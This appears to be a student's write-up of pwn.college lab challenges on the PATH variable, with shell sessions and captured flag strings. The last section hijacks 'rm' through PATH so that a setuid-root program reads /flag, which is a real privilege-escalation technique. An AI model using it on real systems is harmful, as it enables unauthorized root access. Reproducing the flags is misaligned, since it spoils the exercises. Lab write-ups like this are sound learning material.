# The Path variable
    
    hacker@path~the-path-variable:~$ echo $PATH
    /run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

As we can see the `PATH` varibale has a bunch of different paths stored in it. \
Every command that is available on the shell is stored in anyone of these paths. \
Likewise the `rm` command is also stored in one of these paths. And that path is `/usr/bin` \
So in order for bash to not be able to find the `rm` command we need to remove that path

    hacker@path~the-path-variable:~$ export PATH=""
    hacker@path~the-path-variable:~$ /challenge/run
    Trying to remove /flag...
    /challenge/run: line 4: rm: No such file or directory
    The flag is still there! I might as well give it to you!
    pwn.college{sIOqYrijXwfZb0xPtRSm56BLiXE.dZzNwUDL5kzM1czW}

***

&nbsp;

# Setting Path

The `/challenge/run` command will try to invole `win` command by its name so we have to set its path in the path variable.


    hacker@path~setting-path:~$ PATH=/challenge/more_commands/
    hacker@path~setting-path:~$ /challenge/run
    Invoking 'win'....
    Congratulations! You properly set the flag and 'win' has launched!
    pwn.college{cVgUhfhJsADPp_MPEh41wtH_H3U.dVzNyUDL5kzM1czW}

`PATH=/challenge/more_commands/` overrides the PATH varible

***

&nbsp;

# Adding Commands

First we create out script that contains `cat /flag` and make it executabl

    hacker@path~adding-commands:~$ touch win
    hacker@path~adding-commands:~$ vim win
    hacker@path~adding-commands:~$ chmod 700 win
    hacker@path~adding-commands:~$ ls -l win
    -rwx------ 1 hacker hacker 10 Oct 18 16:45 win

Then we edit out `$PATH` variable so that it contains path to our script

    hacker@path~adding-commands:~$ echo $PATH
    /run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    hacker@path~adding-commands:~$ PATH="$PATH:~/"
    hacker@path~adding-commands:~$ echo $PATH
    /run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:~/

As we can see that every path is seperated by colon so we follow the same syntax and overrite path varible with `$PATH` which is old value of path followed by `:~/`. 

Now simply just execute `/challenge/run`

    hacker@path~adding-commands:~$ /challenge/run
    Invoking 'win'....
    pwn.college{g5X8FtK4U8wk7JVYKx1_u5wyg-J.dZzNyUDL5kzM1czW}

***

&nbsp;

# Hijacking command

    hacker@path~hijacking-commands:~$ ls -l /challenge/run
    -rwsr-xr-x 1 root root 450 Jul  4 09:06 /challenge/run

As we can see that `run` command runs as root, which means we can utilise `run` to read `/flag` which owned by root \

And since `run` command executed `rm` on flag we need to remove run from `PATH`

    hacker@path~hijacking-commands:~$ export path=$PATH
    hacker@path~hijacking-commands:~$ PATH=""

Now we will write our own executable and call it `rm` so that `run` will execute it and give us the flag

    hacker@path~hijacking-commands:~$ touch rm
    hacker@path~hijacking-commands:~$ vim rm

The contents of rm is
    
    hacker@path~hijacking-commands:~$ cat rm
    export PATH=$path
    cat /flag

earlier we exported `$path` so that it becomes accesible to root shell as well.
Now `PATH` has all its original paths and therefore we can execute `cat` and since `rm` is executed by `run` which is run as root, `cat` is also run as root and therefore we got our flag.
    
    hacker@path~hijacking-commands:~$ /challenge/run
    Trying to remove /flag...
    pwn.college{c8XPRPdayEqnCg1seI9Gj8ZJyHd.ddzNyUDL5kzM1czW}
